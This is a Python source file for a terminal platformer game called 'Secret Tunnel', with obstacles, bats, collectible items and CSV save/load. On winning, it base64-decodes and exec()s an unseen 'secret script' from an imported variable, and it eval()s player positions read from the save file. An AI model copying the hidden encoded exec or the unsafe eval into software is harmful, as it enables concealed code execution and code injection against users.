import csv
import os
import time
import random
import threading
import base64
import sys
import webbrowser
from colorama import Fore, Style, init
from blessed import Terminal

from . import *

# Initialize colorama and blessed terminal
init(autoreset=True)
term = Terminal()

# New variable to track if secret script should run
secret_unlocked = False

def show_instructions():
    os.system("cls" if os.name == "nt" else "clear")
    print(intro_text)
    input()

def main_menu():
    while True:
        os.system("cls" if os.name == "nt" else "clear")
        print(f"\n{'Secret Tunnel'.center(game.width)}")
        print(main_menu_text)
        choice = input("Select an option: ")
        match choice:
            case "1":
                game.player_name = input("Enter your player name: ")
                if not os.path.exists(game.save_file):
                    create_save_file()
                show_instructions()
                start_game()
            case "2":
                load_game_menu()
            case "3":
                print("Goodbye!")
                return
            case _:
                print("Invalid choice. Please try again.")

def create_save_file():
    if not os.path.exists(game.save_file):
        with open(game.save_file, mode="w", newline="") as file:
            writer = csv.writer(file)
            writer.writerow(["Name", "Score", "Points", "Items", "Level", "MapOffset", "PlayerPos"])

def save_game():
    data = [
        game.player_name, 
        game.score, 
        game.points, 
        game.item_count,
        game.level, 
        game.map_offset,
        game.player_pos
    ]
    
    rows = []
    if os.path.exists(game.save_file):
        with open(game.save_file, mode="r", newline="") as file:
            rows = list(csv.reader(file))
        rows = [row for row in rows if row[0] != game.player_name]
    rows.append(data)
    with open(game.save_file, mode="w", newline="") as file:
        writer = csv.writer(file)
        writer.writerows(rows)

def load_game_menu():
    if not os.path.exists(game.save_file):
        print("No save file found.")
        time.sleep(1)
        return
    with open(game.save_file, mode="r", newline="") as file:
        rows = list(csv.reader(file))
        if len(rows) <= 1:
            print("No saved games available.")
            time.sleep(1)
            return
        print("\nSelect a saved game:")
        for idx, row in enumerate(rows[1:], start=1):
            print(f"{idx}. {row[0]}")
        choice = int(input("Enter your choice: ")) - 1
        if 0 <= choice < len(rows) - 1:
            selected_row = rows[choice + 1]
            game.player_name = selected_row[0]
            game.score = int(selected_row[1])
            game.points = int(selected_row[2])
            game.item_count = int(selected_row[3])
            game.level = int(selected_row[4])
            game.map_offset = int(selected_row[5])
            game.player_pos = eval(selected_row[6])
            start_game()
        else:
            print("Invalid selection.")
            time.sleep(1)

def start_game():
    game.last_checkpoint = game.map_offset
    save_game()
    game.game_over = False
    obstacle_tile.glyph = random.choice(obstacle_glyphs)
    threading.Thread(target=detect_keys, daemon=True).start()
    game_loop()

def randomize_obstacles():
    obstacle_tile.glyph = random.choice(obstacle_glyphs)

def draw_screen():
    with term.location(0, 0):
        screen = [[" " for _ in range(game.width)] for _ in range(game.height)]

        for x in range(game.width):
            screen[game.height - 1][x] = Fore.WHITE + "⫧" + Style.RESET_ALL

        if 0 <= game.player_pos[1] < game.height and 0 <= game.player_pos[0] - game.map_offset < game.width:
            screen[game.player_pos[1]][game.player_pos[0] - game.map_offset] = player_tile

        if game.fireball_active and game.fireball_position:
            x, y = game.fireball_position
            if 0 <= y < game.height and 0 <= x - game.map_offset < game.width:
                screen[y][x - game.map_offset] = fireball_tile

        for obj_list, char in zip(
            [
                game.obstacles, 
                game.platforms, 
                game.secret_items, 
                game.bats, 
                game.level_up_items
            ],
            [
                obstacle_tile,
                platform_tile, 
                item_tile,
                bat_tile,
                level_up_tile
            ]
        ):
            for x, y in obj_list:
                if 0 <= y < game.height and 0 <= x - game.map_offset < game.width:
                    screen[y][x - game.map_offset] = char

        for row in screen:
            print("".join(str(tile) for tile in row))
        print(f"Score: {game.score} | Points: {game.points} | Items Collected: {game.item_count}/{5} | Level: {game.level}")
        if game.item_count >= 5:
            print(Fore.GREEN + "Congratulations! You've collected all items and won the game!" + Style.RESET_ALL)

def update_obstacles():
    current_time = time.time()
    obstacle_delay = max(1.5 / game.level, 1.0)
    if current_time >= game.next_obstacle_time:
        game.obstacles.append([game.width - 1 + game.map_offset, game.height - 2])
        game.next_obstacle_time = current_time + random.uniform(obstacle_delay, obstacle_delay + 1.5)

    for obs in game.obstacles:
        obs[0] -= 1
    if game.obstacles and game.obstacles[0][0] < game.map_offset:
        game.obstacles.pop(0)
        game.score += 1

def update_platforms():

    update_collection = lambda collection: [[x - 1, y] for x, y in collection if x - 1 >= game.map_offset]

    game.platforms = update_collection(game.platforms)

    max_reachable_height = game.height - 2 - game.jump_height + 1
    if random.random() < (0.05 + game.level * 0.01) and len(game.platforms) < 5:
        platform_y = random.randint(max_reachable_height, game.height - 3)
        platform_length = random.randint(4, 8)
        new_platform = [[game.width - 1 + game.map_offset - i, platform_y] for i in range(platform_length)]
        game.platforms.extend(new_platform)

        if random.random() < 0.3:
            game.secret_items.append([game.width - 1 + game.map_offset, platform_y])

        if random.random() < 0.1:
            game.level_up_items.append([game.width - 1 + game.map_offset, platform_y])

    game.secret_items = update_collection(game.secret_items)
    game.level_up_items = update_collection(game.level_up_items)

def update_bats():
    current_time = time.time()
    if current_time >= game.next_bat_time and random.random() < 0.1:
        game.bats.append([game.width - 1 + game.map_offset, random.randint(2, game.height // 2)])
        game.next_bat_time = current_time + random.uniform(7.0, 10.0)

    for i, bat in enumerate(game.bats):
        bat[0] -= 1
        if i % 2 == 0:
            bat[1] += random.choice([-1, 1]) if 3 < bat[1] < game.height - 3 else 0
        if bat[0] < game.width // 2:
            bat[1] += 1
        bat[1] = min(bat[1], game.height - 3)
        game.bats[i] = bat

    game.bats[:] = [bat for bat in game.bats if bat[0] > game.map_offset]

def move_player():
    global secret_unlocked
    if game.jumping and game.jump_progress < game.jump_height:
        game.player_pos[1] -= 1
        game.jump_progress += 1
    elif all([
        game.player_pos[1] < game.height - 2,
        [game.player_pos[0], game.player_pos[1] + 1] not in game.platforms
    ]):
        time.sleep(game.gravity_delay)
        game.player_pos[1] += 1
    else:
        game.jumping = False
        game.jump_progress = 0

    # Update fireball position and check for collisions with bats
    if game.fireball_active and game.fireball_position:
        game.fireball_position = (game.fireball_position[0] + 1, game.fireball_position[1])
        if game.fireball_position[0] >= game.player_pos[0] + 10 + game.map_offset:
            game.fireball_active = False
            game.fireball_position = None

        # Fireball collision with bats (horizontal and vertical proximity)
        for bat in game.bats[:]:
            if all([
                game.fireball_position,
                abs(game.fireball_position[0] - bat[0]) <= 1,
                abs(game.fireball_position[1] - bat[1]) <= 1
            ]):
                game.bats.remove(bat)
                game.fireball_active = False
                game.fireball_position = None
                if random.random() < 0.5:
                    game.secret_items.append([bat[0], bat[1] + 1])
                break

    # Player interaction with items and level-up
    for item in game.secret_items[:]:
        if abs(game.player_pos[0] - item[0]) <= 1 and abs(game.player_pos[1] - item[1]) <= 1:
            game.secret_items.remove(item)
            game.item_count += 1

            # Check if collected 5 special items
            if game.item_count == 5:
                game.game_over = True
                secret_unlocked = True
                # Do not reset item_count here
            break

    for level_item in game.level_up_items[:]:
        if all([
            abs(game.player_pos[0] - level_item[0]) <= 1,
            abs(game.player_pos[1] - level_item[1]) <= 1
        ]):
            game.level_up_items.remove(level_item)
            game.level += 1  # Increase level difficulty
            reset_game()
            break

def reset_game():
    game.obstacles.clear()
    game.platforms.clear()
    game.secret_items.clear()
    game.bats.clear()
    game.level_up_items.clear()
    game.next_obstacle_time = time.time()
    game.next_bat_time = time.time()

def check_checkpoint():
    if game.map_offset - game.last_checkpoint >= game.checkpoint_interval:
        game.last_checkpoint = game.map_offset
        save_game()


def player_done_fucked_up():
    player_state = game.player_pos[:2]
    return any([
        player_state in game.obstacles,
        player_state in game.bats
    ])

def game_loop():
    while not game.game_over:
        move_player()
        update_obstacles()
        update_platforms()
        update_bats()
        draw_screen()
        check_checkpoint()
        time.sleep(0.09)
        if player_done_fucked_up():
            print(f"{red}Game Over!{reset}")
            game.game_over = True
            

    if secret_unlocked:
        print("Debug: About to execute the secret script")
        try:
            exec(base64.b64decode(game_logic).decode('utf-8'), globals())
        except Exception as e:
            print(f"An error occurred in the secret script: {e}")
        print("Debug: Finished executing the secret script")
        # Return to main menu after script execution
        print("Returning to main menu...")
        time.sleep(2)
        main_menu()
    else:
        # Handle regular game over
        # print("Game Over!")
        time.sleep(2)
        main_menu()

def detect_keys():
    while not game.game_over:
        with term.cbreak():
            key = term.inkey(timeout=0.05)
            if key == " " and any([
                    game.player_pos[1] >= game.height - 2,
                    [game.player_pos[0], game.player_pos[1] + 1] in game.platforms
                ]):
                game.jumping = True
            elif key == "a" and not game.fireball_active:
                game.fireball_position = (game.player_pos[0] + 1, game.player_pos[1])
                game.fireball_active = True
            elif key.lower() == "q":
                save_game()
                print("Progress saved. Returning to main menu...")
                time.sleep(1)
                game.game_over = True
                main_menu()


